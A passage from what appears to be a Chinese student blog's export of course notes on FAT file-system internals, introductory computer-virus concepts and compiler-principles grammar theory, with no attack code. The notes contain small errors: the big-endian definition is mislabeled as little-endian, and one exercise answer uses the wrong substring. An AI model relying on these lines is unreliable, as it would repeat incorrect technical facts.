<li>通过首簇号和FAT表获得子目录表的全部内容，根据文件路径的第二项，遍历子目录表，一次偏移32字节用名字匹配的方法查找记录项，如果找到则重复1、2步查找下一项，找不到则结束</li>
<li>如果找到了最后一层目录表（路径的倒数第二项，最后一项是文件名），在其中找到了被查文件的项，从中获取首簇号，即可通过FAT表访问整个文件簇</li>
</ol>
<h4 id="如何删除文件"><a class="markdownIt-Anchor" href="#如何删除文件"></a> 如何删除文件</h4>
<p>只要使目录文件中的记录项无效就可以了，实际目录项的第一个字节被修改成了<code>E5</code>，而对于FAT表中的簇，我们只要把簇链的每一项复原成<code>00</code>就可以了</p>
<p>也就是说，删除文件其实只修改了目录文件和FAT表，实际的文件扇区并没有修改</p>
<h4 id="如何恢复文件"><a class="markdownIt-Anchor" href="#如何恢复文件"></a> 如何恢复文件</h4>
<p>在目录表中查找<code>E5+后续文件名</code>，根据偏移关系找到首簇号，对于只有一个簇的文件恢复简单，将目录表和FAT表中的值更改即可，可是簇链消失了，对于占用多个簇的文件恢复较为复杂，需要遍历数据区，匹配文件标识等恢复簇链</p>
<h4 id="如何创建文件"><a class="markdownIt-Anchor" href="#如何创建文件"></a> 如何创建文件</h4>
<ol>
<li>首先定位到文件所在的目录文件，然后查找目录项，如果第一个字节为00或E5表示可用</li>
<li>根据文件大小计算簇数目，然后在FAT表首部（簇2）开始查找值为00的项，将其簇号写入第一步找到的目录项的首簇号字段</li>
<li>继续在FAT表中找00的项，将簇号写入前一步找到的项中以形成簇链，最后一个簇写入FFF</li>
<li>填写文件目录项的创建时间，属性，大小的字段</li>
</ol>
<h4 id="fat16和fat32文件系统"><a class="markdownIt-Anchor" href="#fat16和fat32文件系统"></a> FAT16和FAT32文件系统</h4>
<p>FAT16：</p>
<ol>
<li>FAT表项为16bits（2字节）</li>
<li>最大簇号0xFFFF，就是65535</li>
<li>一簇为32k</li>
<li>最多管理32k*65535=2GB的分区</li>
</ol>
<p>FAT32：</p>
<ol>
<li>FAT表项为32bits（4字节）</li>
<li>取消了根目录区，而是在引导记录中存放指向根目录区的首簇字段，一般为簇2，</li>
<li>支持长名文件，由扩展的32字节记录项构成</li>
<li>首簇号由2个字段构成，分别代表高位两字节和低位两字节</li>
<li>引导区有保留区</li>
</ol>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒-基础-代码初始</title>
    <url>/archives/b087ef83.html</url>
    <content><![CDATA[<h4 id="1-代码初识"><a class="markdownIt-Anchor" href="#1-代码初识"></a> 1. 代码初识</h4>
<p>我们需要掌握的工具</p>
<ol>
<li>vc反汇编调试</li>
<li>文本编辑工具UltraEdit（UE）</li>
<li>ollydebug调试（od）</li>
<li>静态反汇编工具ida</li>
<li>汇编代码撰写工具nasm</li>
</ol>
<span id="more"></span>
<h4 id="2-大端机和小端机"><a class="markdownIt-Anchor" href="#2-大端机和小端机"></a> 2. 大端机和小端机</h4>
<p>小端机：高位地址存放高位数据、低位地址存放低位数据。例如Intel的X86系列CPU<br />
小端机：高位地址存放低位数据、低位地址存放高位数据。例如PowerPC、Sun的SPARC、Motorola 6800</p>
<h4 id="3-jmp指令解析"><a class="markdownIt-Anchor" href="#3-jmp指令解析"></a> 3. JMP指令解析</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B/image-20210425160344966.png" alt="image-20210425160344966" /></p>
<p>Jmp 无条件跳转指令，有以下四种用法：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B/image-20210425160536816.png" alt="image-20210425160536816" /></p>
<p>注意：在上述PPT中使用了Jmp offset的方式，其中地址2的地址是地址1的地址加上5个字节</p>
<p><strong>使用反汇编修改内存和使用工具修改硬盘文件步骤一样，工具不同，本质相同</strong></p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_概述</title>
    <url>/archives/c513bfe.html</url>
    <content><![CDATA[<h4 id="你能学到什么"><a class="markdownIt-Anchor" href="#你能学到什么"></a> 你能学到什么？</h4>
<ol>
<li>代码解密</li>
<li>文件系统和硬盘数据结构</li>
<li>DOS下的病毒技术：文件型病毒，引导型病毒，中断型病毒</li>
<li>Windows下的病毒：PE病毒，导入表，导出表，病毒的入口点模糊技术</li>
</ol>
<h4 id="先决课程"><a class="markdownIt-Anchor" href="#先决课程"></a> 先决课程</h4>
<ol>
<li>汇编语言</li>
<li>计算机组成原理</li>
</ol>
<span id="more"></span>
<h4 id="11-病毒定义"><a class="markdownIt-Anchor" href="#11-病毒定义"></a> 1.1 病毒定义</h4>
<p>计算机病毒：病毒特征+程序代码</p>
<h4 id="12-病毒的本质与特征"><a class="markdownIt-Anchor" href="#12-病毒的本质与特征"></a> 1.2 病毒的本质与特征</h4>
<p><strong>病毒的固有本质属性：人为的特制程序</strong><br />
程序性和客观性决定了病毒的可防治性和可清除性<br />
人为性和主观性导致了病毒各异多变</p>
<h5 id="基本特征传染性"><a class="markdownIt-Anchor" href="#基本特征传染性"></a> 基本特征：传染性</h5>
<p>传染性是指计算机病毒把自身复制到其他程序的能力<br />
即将自身的代码<strong>强行</strong>传染到<strong>一切符合其传染条件</strong>的程序之上<br />
是否具有传染性是判别一个程序是否为计算机病毒的<strong>首要条件</strong></p>
<h5 id="基本特征隐蔽性"><a class="markdownIt-Anchor" href="#基本特征隐蔽性"></a> 基本特征：隐蔽性</h5>
<p>传染过程的隐蔽性<br />
病毒存在的隐蔽性</p>
<h5 id="基本特征可触发性"><a class="markdownIt-Anchor" href="#基本特征可触发性"></a> 基本特征：可触发性</h5>
<p>可触发性是指因某个事件或数值的出现，触发病毒实施感染或攻击破坏<br />
即隐藏又保持破坏力</p>
<h5 id="其他基本特征"><a class="markdownIt-Anchor" href="#其他基本特征"></a> 其他基本特征</h5>
<ol>
<li>欺骗性</li>
<li>非授权性</li>
<li>寄生性</li>
<li>衍生性</li>
<li>持久性</li>
<li>破坏性</li>
<li>针对性</li>
<li>不可预见性</li>
</ol>
<h4 id="13-病毒的分类"><a class="markdownIt-Anchor" href="#13-病毒的分类"></a> 1.3 病毒的分类</h4>
<ol>
<li>
<p>根据病毒表现行为分类</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205247089.png" alt="image-20210422205247089" /></p>
</li>
<li>
<p>根据病毒的内部机理分类<br />
<img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205355394.png" alt="image-20210422205355394" /></p>
</li>
</ol>
<h4 id="14-恶意程序-蠕虫-木马"><a class="markdownIt-Anchor" href="#14-恶意程序-蠕虫-木马"></a> 1.4 恶意程序 蠕虫 木马</h4>
<p>恶意程序：未经授权便干扰或破坏计算机系统/网络的程序或代码，早期恶意代码的主要形式是计算机病毒<br />
蠕虫：独立的可执行程序，不需要寄生在宿主程序中，通过网络分发自己的副本<br />
病毒和蠕虫的区别：<br />
<img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205811795.png" alt="image-20210422205811795" /><br />
特洛伊木马：在远程计算机之间建立连接，使得远程计算机能通过网络控制本地计算机的非法程序</p>
<h4 id="15-病毒的命名规则"><a class="markdownIt-Anchor" href="#15-病毒的命名规则"></a> 1.5 病毒的命名规则</h4>
<p>一些普通命名规则</p>
<ol>
<li>按病毒的发作时间命名</li>
<li>按病毒的发作症状命名</li>
<li>按病毒的发现地命名</li>
<li>按病毒的字节长度命名</li>
</ol>
<p>国际命名惯例<br />
前缀（病毒的种类）+病毒名（病毒家族的特征）+后缀（区分病毒变种）</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第四章</title>
    <url>/archives/e30708a5.html</url>
    <content><![CDATA[<h3 id="程序语言的设计"><a class="markdownIt-Anchor" href="#程序语言的设计"></a> 程序语言的设计</h3>
<h4 id="1-程序设计语言的定义"><a class="markdownIt-Anchor" href="#1-程序设计语言的定义"></a> 1. （程序设计）语言的定义</h4>
<p>语言=语法（规则）+语义（规则）</p>
<p>语法：构造程序及其成分（单词、语法单位）的规则集合</p>
<p>语义：定义语言的单词符号和语法单位的作用和意义的规则组合</p>
<span id="more"></span>
<ul>
<li>
<p>可以从生成（文法）和识别（语法图）的角度描述语法</p>
<h5 id="11-文法描述语法规则生成角度"><a class="markdownIt-Anchor" href="#11-文法描述语法规则生成角度"></a> 1.1 文法描述语法规则：生成角度</h5>
<blockquote>
<p>&lt;标识符&gt;→&lt;字母&gt;<br />
&lt;标识符&gt;→&lt;标识符&gt;&lt;字母&gt;<br />
&lt;标识符&gt;→&lt;标识符&gt;&lt;数字&gt;<br />
&lt;字母&gt;→A|…|Z|a|…|z<br />
&lt;数字&gt;→0|…|9</p>
</blockquote>
<blockquote>
<p>&lt;表达式&gt;→&lt;标识符&gt;<br />
&lt;表达式&gt;→(&lt;表达式&gt;)<br />
&lt;表达式&gt;→&lt;表达式&gt;&lt;运算符&gt;&lt;表达式&gt;<br />
&lt;运算符&gt;→+|-|*|/</p>
<p><strong>注意：这里没有考虑运算符的优先级</strong></p>
</blockquote>
<h5 id="12-语法图描述语法规则识别角度"><a class="markdownIt-Anchor" href="#12-语法图描述语法规则识别角度"></a> 1.2  语法图描述语法规则：识别角度</h5>
<blockquote>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210413153851229.png" alt="image-20210413153851229" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210413153918317.png" alt="image-20210413153918317" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210413153937838.png" alt="image-20210413153937838" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210413154819595.png" alt="image-20210413154819595" /></p>
<h6 id="识别原则"><a class="markdownIt-Anchor" href="#识别原则"></a> 识别原则：</h6>
<ul>
<li>终结符框:标识的终结符与被识别的终结符刚好符合</li>
<li>非终结符框:由该非终结符的语法图识别</li>
<li>分支:若遇到分支，则任选一分支识别；</li>
<li>回溯:若一个分支识别不成功，则选另一分支识别</li>
<li>若一个终结符序列是合法的：<br />
那么,必须从语法图的入口边通过语法图而到达出口边，<br />
且在通过的过程中,恰恰能识别该终结符序列。</li>
<li>语言：语法图能识别的所有终结符序列的集合。称为语言。</li>
</ul>
<h6 id="语法图的构造"><a class="markdownIt-Anchor" href="#语法图的构造"></a> 语法图的构造</h6>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210413155020391.png" alt="image-20210413155020391" /></p>
</blockquote>
<h5 id="13-高级语言语法规则描述方法"><a class="markdownIt-Anchor" href="#13-高级语言语法规则描述方法"></a> 1.3 高级语言语法规则描述方法</h5>
<p>FORTRAN采用自然语言描述语法；<br />
ALGOL 60首次用BNF对语法进行形式描述,为语言定义做出了重要贡献；<br />
Pascal首次采用语法图来定义语言，给出了较为直观的语法结构。</p>
<h5 id="14-语法描述方法等价"><a class="markdownIt-Anchor" href="#14-语法描述方法等价"></a> 1.4 语法描述方法等价</h5>
<p>文法和语法图是语言语法的等价表示<br />
文法从产生的观点来定义语言的语法，通用性好。<br />
语法图以识别的观点定义语言的语法，更直观和清晰。</p>
<h5 id="15-语法的作用"><a class="markdownIt-Anchor" href="#15-语法的作用"></a> 1.5 语法的作用</h5>
<p>①表达语言设计者的意图和设计目标；<br />
②指导语言的使用者编写正确的程序；（先使用语义规则后使用语法规则）<br />
③指导语言的实现者识别所有语法单位。（先使用语法规则后使用语义规则）</p>
</li>
<li>
<p>本章语义使用自然语言描述、下篇语义以操作语义学的方法描述</p>
</li>
</ul>
<h4 id="2-文法"><a class="markdownIt-Anchor" href="#2-文法"></a> 2. 文法</h4>
<p>定义：文法是描述语言语法结构的形式规则</p>
<p>优点：通用、准确、易于理解、描述能力强</p>
<blockquote>
<p>文法G是一个四元式，G=（V<sub>T</sub> ，V<sub>N</sub> ，S ，P ）</p>
<p>V<sub>T</sub> 是有限字符的集合，元素称为字母或者<strong>终结符</strong></p>
<p>V<sub>N</sub> 是有限字符的集合，元素称为变量或<strong>非终结符</strong></p>
<p>S∈V，称为文法的开始符号</p>
<p>P是产生式α-&gt;β的集合</p>
</blockquote>
<blockquote>
<p>α∈(V<sub>T</sub> U V<sub>N</sub> )<sup>+</sup> ，至少包含一个非终结符，α∈V<sup>*</sup> V<sub>N</sub> V<sup>*</sup></p>
<p>β∈(V<sub>T</sub> U V<sub>N</sub> )<sup>*</sup></p>
<p>α-&gt;ε，称为空串产生式或者ε产生式</p>
</blockquote>
<h5 id="21-候选式"><a class="markdownIt-Anchor" href="#21-候选式"></a> 2.1 候选式</h5>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210420083948266.png" alt="image-20210420083948266" /></p>
<h5 id="22-文法的分类"><a class="markdownIt-Anchor" href="#22-文法的分类"></a> 2.2 文法的分类</h5>
<ol>
<li>
<p>0型文法（PSG）</p>
<p>α-&gt;β</p>
</li>
<li>
<p>1型文法（上下文有关文法CSG）</p>
<p>|α|&lt;=|β| （S-&gt;ε例外）</p>
<blockquote>
<p>标准形式：</p>
<p>yAz-&gt;yωz</p>
<p>其中：</p>
<p>A∈V<sub>N</sub> ;</p>
<p>y,z∈(V<sub>T</sub> U V<sub>N</sub> )<sup>*</sup> ;</p>
<p>ω∈(V<sub>T</sub> U V<sub>N</sub> )<sup>+</sup> ;</p>
<p>（S-&gt;ε例外）</p>
</blockquote>
</li>
<li>
<p>2型文法（上下文无关文法CFG）</p>
<p>A-&gt;β</p>
</li>
<li>
<p>3型文法（正则文法RG，或右线性文法RLG）</p>
<p>A-&gt;u或A-&gt;wB</p>
<p>其中u∈V<sub>T</sub> <sup>*</sup> ，w∈V<sub>T</sub> <sup>+</sup></p>
</li>
</ol>
<h4 id="3-文法产生的语言"><a class="markdownIt-Anchor" href="#3-文法产生的语言"></a> 3. 文法产生的语言</h4>
<h5 id="31-推导与归约"><a class="markdownIt-Anchor" href="#31-推导与归约"></a> 3.1 推导与归约</h5>
<ol>
<li>
<p>直接推导</p>
<p>wαv=&gt;wβv，即由产生式右边替换产生式左边</p>
</li>
<li>
<p>任意步推导</p>
<p>y=&gt;<sup>*</sup> z</p>
</li>
<li>
<p>多步推导</p>
<p>y=&gt;<sup>+</sup> z</p>
</li>
</ol>
<blockquote>
<p>eg：已知文法G（E）</p>
<p>E-&gt;E+E|E*E|(E)|i</p>
<ol>
<li>
<p>i+i*i的（其中一种）最左推导过程</p>
<p>E=&gt;E+E=&gt;i+E=&gt;i+E*E=&gt;i+i*E=&gt;i+i*i</p>
<p>E=&gt;E*E=&gt;E+E*E=&gt;i+E*E=&gt;i+i*E=&gt;i+i*i</p>
</li>
<li>
<p>i+i*i的最右推导（规范推导）</p>
<p>E=&gt;E+E=&gt;E+E*E=&gt;E+E*i=&gt;E+i*i=&gt;i+i*i</p>
<p>E=&gt;E*E=&gt;E*i=&gt;E+E*i=&gt;E+i*i=&gt;i+i*i</p>
</li>
</ol>
</blockquote>
<h5 id="32-句型和句子"><a class="markdownIt-Anchor" href="#32-句型和句子"></a> 3.2 句型和句子</h5>
<blockquote>
<p>文法G=（V<sub>T</sub> ,V<sub>N</sub> ,S,P）</p>
<p>S=&gt;<sup>*</sup> w</p>
<p>若w∈V<sup>*</sup> ，则w为文法G的一个句型</p>
<p>若w∈V<sub>T</sub> <sup>*</sup> ，则w是一个句子（只含终结符的句型就是一个句子）</p>
</blockquote>
<blockquote>
<p>所有句子的集合称为文法G产生的语言记为L（G）</p>
<p>即L（G）={α|S=&gt;<sup>+</sup> α且α∈V<sub>T</sub> <sup>*</sup> }</p>
</blockquote>
<h5 id="33-文法的重要特性"><a class="markdownIt-Anchor" href="#33-文法的重要特性"></a> 3.3 文法的重要特性</h5>
<p>有限规则描述无穷语言</p>
<h5 id="34-文法等价"><a class="markdownIt-Anchor" href="#34-文法等价"></a> 3.4 文法等价</h5>
<p>两个文法G和G<sup>’</sup> ，如果有L（G）=L（G<sup>’</sup> ），则称G和G<sup>’</sup> 等价</p>
<h4 id="4-推导树语法树"><a class="markdownIt-Anchor" href="#4-推导树语法树"></a> 4. 推导树（语法树）</h4>
<p>定义：推导树是一颗有序的标记树，每个结点的标记是文法G的非终结符或终结符或空串ε。其中标记为A的内部结点从左到右有子结点x1、x2、……xn，则A-&gt;x1……xn是一个产生式。</p>
<h5 id="41-推导树的边缘"><a class="markdownIt-Anchor" href="#41-推导树的边缘"></a> 4.1 推导树的边缘</h5>
<p>定义：推导树所有叶节点<strong>从左到右</strong>的连接</p>
<h5 id="42-文法的二义性"><a class="markdownIt-Anchor" href="#42-文法的二义性"></a> 4.2 文法的二义性</h5>
<p>定义：一个句子有两颗不同的推导树</p>
<h5 id="43-短语-直接短语-句柄"><a class="markdownIt-Anchor" href="#43-短语-直接短语-句柄"></a> 4.3 短语、直接短语、句柄</h5>
<p>详见第八章</p>
<h4 id="5-语言的设计"><a class="markdownIt-Anchor" href="#5-语言的设计"></a> 5. 语言的设计</h4>
<p>eg：</p>
<p>表达式的设计：</p>
<ol>
<li>逻辑表达式</li>
<li>关系表达式</li>
<li>算术表达式</li>
</ol>
<blockquote>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210426173640256.png" alt="image-20210426173640256" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210426173737710.png" alt="image-20210426173737710" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%9B%9B%E7%AB%A0/image-20210426173753654.png" alt="image-20210426173753654" /></p>
</blockquote>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第四章前导</title>
    <url>/archives/5f3d4781.html</url>
    <content><![CDATA[<h3 id="形式语言与自动机"><a class="markdownIt-Anchor" href="#形式语言与自动机"></a> 形式语言与自动机</h3>
<h4 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h4>
<p>字母表有非空性、有穷性、单一性</p>
<blockquote>
<p>Σ代表字母表<br />
ε代表空串<br />
{ε}代表仅含有空串的集合<br />
Φ代表空集<br />
αβ代表两个字符串α与β的连接（并置）<br />
α<sup>n</sup> 代表α的n次连接，其中α<sup>0</sup> =ε，α<sup>n</sup> =α<sup>n-1</sup> α  其中n&gt;0<br />
AB代表集合A与B的连接，A={a1,a2,a3,…,an}，B={b1,b2,b3,…,bm}</p>
<span id="more"></span>
<blockquote>
<p>则AB=<br />
{ a1b1，a1b2，a1b3，…，a1bm，<br />
a2b1，a2b2，a2b3，…，a2bm，<br />
a3b1，a3b2，a3b3，…，a3bm，<br />
…<br />
anb1，anb2，anb3，…，anbm }</p>
<p>注意：AФ=ФA=Ф，A{ε}={ε}A=A</p>
</blockquote>
<p>A<sup>n</sup> 代表集合A的n次连接（n次幂），A<sup>0</sup> = {ε}，A<sup>n</sup> = A<sup>n-1</sup>A    n ≥ 1<br />
A<sup>*</sup> 代表A上所有字符串的集合，称作集合A的克林闭包<br />
A<sup>*</sup> = A<sup>0</sup> ∪ A<sup>1</sup> ∪ A<sup>2</sup> ∪  …∪ A<sup>n</sup><br />
A<sup>+</sup> 称为A的正闭包<br />
A<sup>+</sup>=A<sup>1</sup>∪A<sup>2</sup>∪A<sup>3</sup>∪…∪A<sup>n</sup></p>
</blockquote>
<p>定义：</p>
<p>给定字母表∑，则∑*的任意子集L称为字母表∑上的一个语言。</p>
<p>设∑是一个字母表，∀L ⊆ ∑*, ∀x ∈ L, x称为L的一个句子。</p>
<blockquote>
<p>eg：Σ＝{0，1}，请给出语言的形式表示</p>
<ol>
<li>所有以0开头，以1结尾的串的语言。</li>
<li>所有以11开头，11结尾的串的语言。</li>
<li>所有长度为偶数的串的语言。</li>
<li>所有长度为奇数的串的语言。</li>
<li>所有包含子串01011的串的语言。</li>
<li>所有的第10个字符是0的串的语言。</li>
</ol>
<p>answer：</p>
<ol>
<li>{0} {0,1}<sup>*</sup> {1}</li>
<li>{11} {0,1}<sup>*</sup> {11} ∪ {11,111}</li>
<li>{00,01,10,11}<sup>*</sup></li>
<li>{00,01,10,11}<sup>*</sup> {0,1}</li>
<li>{0,1}<sup>*</sup> {011011} {0,1}<sup>*</sup></li>
<li>{0,1}<sup>9</sup> {0} {0,1}<sup>*</sup></li>
</ol>
</blockquote>
<h4 id="形式语言与自动机理论简介"><a class="markdownIt-Anchor" href="#形式语言与自动机理论简介"></a> 形式语言与自动机理论简介</h4>
<h5 id="初步认识"><a class="markdownIt-Anchor" href="#初步认识"></a> 初步认识</h5>
<p>语言的定义可以从两个方面进行：</p>
<ol>
<li>从产生语言的角度</li>
<li>从接收（识别）语言的角度</li>
</ol>
<ul>
<li>
<p>产生语言</p>
<p>根据语言中的基本句子和其他句子的形成规则，得到（产生）该语言所包含的所有句子</p>
<p>属于<strong>形式语言</strong>所研究的问题</p>
</li>
<li>
<p>接收语言</p>
<p>使用自动机模型来接收字符串，接收的所有字符串，也形成一个语言</p>
<p>属于<strong>自动机</strong>所研究的问题</p>
</li>
</ul>
<h5 id="统一的理论"><a class="markdownIt-Anchor" href="#统一的理论"></a> 统一的理论</h5>
<p>形式语言与自动机作为统一的理论，实际上包括3个方面的内容：</p>
<ol>
<li>形式语言理论（产生语言）</li>
<li>自动机理论（接收语言）</li>
<li>形式语言与自动机的等价性理论</li>
</ol>
<h5 id="括号匹配串的语言"><a class="markdownIt-Anchor" href="#括号匹配串的语言"></a> 括号匹配串的语言</h5>
<p><strong>自然语言描述：</strong></p>
<blockquote>
<ol>
<li>
<p>（）是该语言的最基本的句子</p>
</li>
<li>
<p>若S是句子，则（S）是句子</p>
</li>
<li>
<p>若S是句子，则SS是句子</p>
</li>
</ol>
</blockquote>
<p>根据以上形成规则，我们可以：</p>
<ol>
<li>产生该语言的任意的句子</li>
<li>判断某个串是否是该语言的句子——<strong>语法分析</strong></li>
</ol>
<p><strong>巴克斯-诺尔范式（BNF）描述：</strong></p>
<blockquote>
<ol>
<li>
<p>&lt;括号匹配串&gt;::=()</p>
</li>
<li>
<p>&lt;括号匹配串&gt;::=(&lt;括号匹配串&gt;)</p>
</li>
<li>
<p>&lt;括号匹配串&gt;::=&lt;括号匹配串&gt;&lt;括号匹配串&gt;</p>
</li>
</ol>
</blockquote>
<p><strong>Chomsky描述：</strong></p>
<blockquote>
<ol>
<li>
<p>S-&gt;()</p>
</li>
<li>
<p>S-&gt;(S)</p>
</li>
<li>
<p>S-&gt;SS</p>
</li>
</ol>
<p><strong>注：为方便起见，箭头打成-&gt;</strong></p>
</blockquote>
<p>术语：</p>
<blockquote>
<ol>
<li>S称为非终结符，是在推导中可以被替代的符号。</li>
<li>（）称为终结符，是在推导中不可以被替代的符号</li>
<li>-&gt;是产生式系统的元符号</li>
</ol>
</blockquote>
<p>结论：</p>
<p>一个语言，可以使用不同的产生式组合来产生。</p>
<p>注意：</p>
<p>D-&gt;0|1|2|3|4|5|6|7|8|9<strong>不能</strong>简写为D-&gt;0|…|9</p>
<p>eg：算术表达式的形成规则</p>
<blockquote>
<p>E-&gt;E+T|E-T|T<br />
T-&gt;T*F|T/F|F<br />
F-&gt;(E)|I<br />
I-&gt;L|IL|ID<br />
L-&gt;a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z<br />
D-&gt;0|1|2|3|4|5|6|7|8|9</p>
</blockquote>
<p>注意：其中E代表表达式，T代表项，F代表因子，先因子再乘除最后加减</p>
<p>注：这是算术表达式，不包含关系表达式的定义（&lt;、&lt;=、&gt;、&gt;=、&lt; &gt;、=），并且标识符没有考虑下划线和大写字母</p>
<h4 id="文法"><a class="markdownIt-Anchor" href="#文法"></a> 文法</h4>
<p>定义：</p>
<blockquote>
<p>文法G是一个四元式，G=（V<sub>T</sub> ，V<sub>N</sub> ，S ，P ）</p>
<p>V<sub>T</sub> 是有限字符的集合，元素称为字母或者<strong>终结符</strong></p>
<p>V<sub>N</sub> 是有限字符的集合，元素称为变量或<strong>非终结符</strong></p>
<p>S∈V，称为文法的开始符号</p>
<p>P是产生式α-&gt;β的集合</p>
<blockquote>
<p>α∈(V<sub>T</sub> U V<sub>N</sub> )<sup>+</sup> ，至少包含一个非终结符</p>
<p>β∈(V<sub>T</sub> U V<sub>N</sub> )<sup>*</sup></p>
<p>α-&gt;ε，称为空串产生式或者ε产生式</p>
</blockquote>
</blockquote>
<h5 id="推导派生"><a class="markdownIt-Anchor" href="#推导派生"></a> 推导（派生）</h5>
<p>定义：文法G，α和β是集合(V<sub>T</sub> ∪V<sub>N</sub> )上的串，α= pvr ，β=pur(p和r可能同时为ε)，而v→u是的一个产生式，则称α直接推导出β，记为α=&gt;β ，即pvr =&gt;pur。</p>
<p>术语：</p>
<blockquote>
<p>y=&gt;<sup>+</sup> z 多步推导<br />
y=&gt;<sup>*</sup> z 任意步推导（多了y=z的情况）</p>
<p>S=&gt;<sup>*</sup> ω 则ω是文法的一个句型<br />
进一步若ω∈V<sub>T</sub> <sup>*</sup> ，ω称为句子</p>
<p>L(G) ={ω|S=&gt;<sup>+</sup> ω，且ω∈V<sub>T</sub>*} ，则L（G）称为文法G产生的语言</p>
<blockquote>
<p>一个语言<strong>可以</strong>由多个不同的文法产生<br />
一个文法<strong>只能</strong>产生一个语言</p>
</blockquote>
</blockquote>
<p>eg：</p>
<blockquote>
<p>产生语言L（G）= { a<sup>n</sup> b<sup>n</sup> c<sup>n</sup> |n&gt;0} 文法</p>
<blockquote>
<p>解一：</p>
<p>S→aSBC        ①<br />
S→aBC          ②<br />
CB→BC         ③<br />
aB→ab          ④<br />
bB→bb          ⑤<br />
bC→bc          ⑥<br />
cC→cc           ⑦</p>
<p>解二：</p>
<p>S→abc|aSBc<br />
cB→Bc<br />
aB→ab<br />
bB→bb</p>
<p><strong>类似思想还可以写出很多文法</strong></p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第三章</title>
    <url>/archives/542a11c0.html</url>
    <content><![CDATA[<h3 id="控制结构"><a class="markdownIt-Anchor" href="#控制结构"></a> 控制结构</h3>
<p>定义：规定程序语句和程序单元的执行流程</p>
<p>分类：语句级控制结构、单元级控制结构</p>
<h4 id="语句级控制结构"><a class="markdownIt-Anchor" href="#语句级控制结构"></a> 语句级控制结构</h4>
<p>定义：用来构造语句执行流程的机制</p>
<p>分类：顺序、选择（分支）、重复（循环）</p>
<span id="more"></span>
<ol>
<li>
<p>顺序</p>
<blockquote>
<p>语句结束标记 ；</p>
<p>复合语句：begin……end、{……}</p>
</blockquote>
</li>
<li>
<p>选择</p>
<blockquote>
<p>单选if then</p>
<p>二选一if then else</p>
<p>多选一 嵌套if then else</p>
</blockquote>
</li>
<li>
<p>重复</p>
<blockquote>
<p>计数器制导</p>
<p>条件制导</p>
</blockquote>
</li>
</ol>
<h4 id="单元级控制结构"><a class="markdownIt-Anchor" href="#单元级控制结构"></a> 单元级控制结构</h4>
<p>定义：规定程序单元之间控制流程的机制</p>
<h5 id="显式调用从属单元"><a class="markdownIt-Anchor" href="#显式调用从属单元"></a> 显式调用从属单元</h5>
<blockquote>
<p>eg：</p>
<p>FORTRAN语言的子程序和函数</p>
<p>PASCAL语言的函数和过程</p>
<p>C语言的函数</p>
</blockquote>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%B8%89%E7%AB%A0/image-20210413150345535.png" alt="image-20210413150345535" /></p>
<h5 id="隐式调用单元异常处理"><a class="markdownIt-Anchor" href="#隐式调用单元异常处理"></a> 隐式调用单元——异常处理</h5>
<p>异常定义：导致程序正常执行中止的事件</p>
<p>异常处理的主要问题：</p>
<blockquote>
<ol>
<li>异常如何说明，它的作用域是什么？</li>
<li>异常如何发生？（如何捕获异常）</li>
<li>发生异常时，流程如何转移？</li>
<li>发生异常时，如何绑定相应的异常处理程序？</li>
<li>处理异常之后，控制流程转向何处？</li>
</ol>
</blockquote>
<blockquote>
<p>问题（5）的解决方法：</p>
<ol>
<li>
<p>允许控制返回发生异常事件的执行点</p>
<p>这种情况下，异常处理程序可对执行的程序进行“修补”，终止相应的异常事件，以便程序继续正常地执行。</p>
<p>解决了程序继续执行的问题，但并未真正消除发生异常的因素。</p>
</li>
<li>
<p>由异常处理程序进行控制的转移</p>
